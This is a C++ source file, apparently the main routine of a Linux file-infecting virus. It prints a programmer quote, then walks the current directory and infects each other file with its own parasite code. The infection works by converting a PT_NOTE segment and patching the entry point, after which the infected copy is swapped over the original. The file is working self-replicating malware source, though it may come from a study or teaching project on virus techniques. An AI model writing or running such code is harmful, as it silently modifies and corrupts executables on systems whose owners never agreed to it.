#include <cstddef>
#include <span>
#include "common/directory_iterator.hh"
#include "common/get_symbol_addr.hh"
#include "common/macros.hh"
#include "common/mmap.hh"
#include "infector/common_infection.hh"
#include "infector/pt_note_infector.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/stdlib.hh"
#include "nostdlib/string.hh"
#include "nostdlib/unistd.hh"
#include "redirection/entry_point.hh"

int main(int argc, char* argv[], char* env[]) {
  const char* quote1 = STR_LITERAL(
      "If debugging is the process of removing software bugs, then programming "
      "must be the process of putting them in. - Edsger Dijkstra\n");
  const char* quote2 = STR_LITERAL(
      "If carpenters made buildings the way programmers make programs, the "
      "first woodpecker to come along would destroy all of civilization. - "
      "Unknown programmer\n");

  auto addr =
      reinterpret_cast<uintptr_t>(vt::common::get_parasite_start_address());
  const char* str = (addr & 0x100000) ? quote1 : quote2;

  vt::write(1, str, vt::strlen(str));

  char dir[] = {'.', 0};

  for (auto it : vt::common::DirectoryIterator(dir)) {
    if (it.type == vt::common::DirectoryIterator::EntryType::FILE) {
      const char* host_path = it.name;
      auto host = vt::common::FileDescriptor(host_path, O_RDONLY);
      if (!host.valid()) {
        continue;
      }

      auto host_size = host.file_size();
      if (host_size == 0 ||
          !vt::strcmp(host_path,
                      argv[0] + vt::strlen(argv[0]) - vt::strlen(host_path))) {
        continue;
      }

      vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_PRIVATE,
                                               host.handle(), 0);
      std::span<const std::byte> parasite(
          vt::common::get_parasite_start_address(),
          vt::common::get_parasite_len());
      std::span<const std::byte> host_span(host_mapping.base(),
                                           host_mapping.size());

      char tmp[PATH_MAX];
      auto len = vt::strlen(host_path);
      vt::strcpy(tmp, host_path);
      tmp[len] = '.';
      tmp[len + 1] = '\0';

      auto new_host = vt::infector::infect<vt::infector::PtNoteInfector,
                                           vt::redirection::EntryPointPatcher>(
          host_span, parasite, tmp,
          vt::common::get_patch_return_offset_from_parasite_start());
      if (!new_host.valid()) {
        continue;
      }

      if (!vt::infector::atomic_swap_host(host.handle(), host_path,
                                          new_host.handle(), tmp)) {
        (void)vt::unlink(tmp);
      }
    }
  }
  return 0;
}